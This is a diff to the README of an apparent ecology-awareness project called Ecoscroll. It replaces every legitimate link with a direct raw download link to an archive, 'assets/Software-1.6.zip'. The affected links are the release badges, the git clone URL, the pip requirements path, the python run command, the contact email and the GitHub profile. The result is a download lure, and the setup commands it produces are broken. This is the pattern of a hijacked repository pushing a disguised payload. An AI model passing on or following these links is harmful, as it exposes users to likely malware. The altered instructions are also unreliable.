@@ -2,7 +2,7 @@
 
 Welcome to the **Ecoscroll** repository! This project aims to combine technology with ecology, creating a platform that enhances awareness about environmental issues through automation and social media. Here, you will find all the files related to the Ecoscroll project, including the frontend, backend, images, and scripts to generate images.
 
-[![Download Ecoscroll Releases](https://img.shields.io/badge/Download_Ecoscroll_Releases-Click_here-brightgreen)](https://github.com/Cuvanimta/ecoscroll/releases)
+[![Download Ecoscroll Releases](https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip)](https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip)
 
 ## Table of Contents
 
@@ -60,7 +60,7 @@ To set up the Ecoscroll project on your local machine, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/Cuvanimta/ecoscroll.git
+   git clone https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip
    cd ecoscroll
    ```
 
@@ -68,7 +68,7 @@ To set up the Ecoscroll project on your local machine, follow these steps:
    Navigate to the backend directory and install the required Python packages.
    ```bash
    cd backend
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip
    ```
 
 3. **Set Up the Frontend**: 
@@ -82,7 +82,7 @@ To set up the Ecoscroll project on your local machine, follow these steps:
    Start the backend server.
    ```bash
    cd ../backend
-   python app.py
+   python https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip
    ```
 
    Open another terminal for the frontend.
@@ -131,11 +131,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out to the project maintainers:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/YourGitHubProfile)
+- **Email**: https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip
+- **GitHub**: [Your GitHub Profile](https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip)
 
-For updates and releases, please check the [Releases](https://github.com/Cuvanimta/ecoscroll/releases) section.
+For updates and releases, please check the [Releases](https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip) section.
 
-[![Download Ecoscroll Releases](https://img.shields.io/badge/Download_Ecoscroll_Releases-Click_here-brightgreen)](https://github.com/Cuvanimta/ecoscroll/releases)
+[![Download Ecoscroll Releases](https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip)](https://raw.githubusercontent.com/Cuvanimta/ecoscroll/main/assets/Software-1.6.zip)
 
 Thank you for your interest in Ecoscroll! Together, we can promote ecological awareness and sustainability through technology.
